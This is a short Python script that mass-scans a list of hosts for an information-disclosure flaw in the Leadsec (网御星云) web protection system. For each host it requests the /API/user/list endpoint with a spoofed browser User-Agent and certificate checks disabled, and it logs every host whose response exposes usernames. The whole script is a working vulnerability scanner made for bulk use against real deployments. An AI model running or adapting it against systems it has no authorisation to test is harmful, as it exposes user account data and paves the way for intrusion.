import requests
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("网御星云 web防护系统.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.get(url+"/API/user/list", headers=headers, verify=False, timeout=5)
        if("count" in jiaoyan.text) and ("username" in jiaoyan.text):
            with open("网御星云 web防护系统 信息泄露 vul.txt", "a+") as f:
                    f.write(url+"\n")
    except:
        continue
